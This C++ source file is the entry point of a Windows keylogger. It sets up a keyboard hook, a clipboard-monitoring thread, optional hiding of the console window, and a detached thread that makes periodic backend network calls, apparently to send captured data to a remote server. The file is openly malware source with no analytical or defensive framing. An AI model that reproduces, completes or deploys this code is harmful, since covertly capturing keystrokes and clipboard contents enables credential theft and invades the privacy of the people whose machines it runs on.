#include "config.hpp"
#include "keylogger.hpp"
#include "logger_utils.hpp"
#include "network.hpp"
#include <iostream>
#include <thread>
#include <map>
#include <fstream> // Added for file operations

extern const Config* g_config_ptr;

int main() {
    Config config;
    std::string stateFile = Config::getStateFilePath();
    if (!config.loadFromFile(stateFile)) {
        config.saveToFile(stateFile);
        std::ofstream(stateFile, std::ios::app) << "\n// This file stores keylogger config and state. Edit with care.\n";
    }
    g_config_ptr = &config;
    std::string compName = getUserName();
    std::cout << "Computer Name: " << compName << std::endl;
    std::cout << "Starting network scheduler thread..." << std::endl;
    std::thread schedulerThread(scheduleBackendCalls, config.intervalMinutes * 60, std::ref(config));
    schedulerThread.detach();
    std::cout << "Network scheduler thread started and detached" << std::endl;
    std::cout << "Starting clipboard monitor thread..." << std::endl;
    std::thread clipboardThread(Keylogger::RunClipboardMonitor, &config);
    std::cout << "Clipboard monitor thread started" << std::endl;
    Keylogger::SetConsoleVisibility(config);
    if (config.boot_wait) {
        while (Keylogger::IsSystemBooting(config)) {
            Sleep(10000);
        }
    }
    std::cout << "Installing keylogger hook..." << std::endl;
    Keylogger& logger = Keylogger::GetInstance(config);
    logger.InstallHook();
    std::cout << "Starting keylogger..." << std::endl;
    logger.Run();
    clipboardThread.join();
} 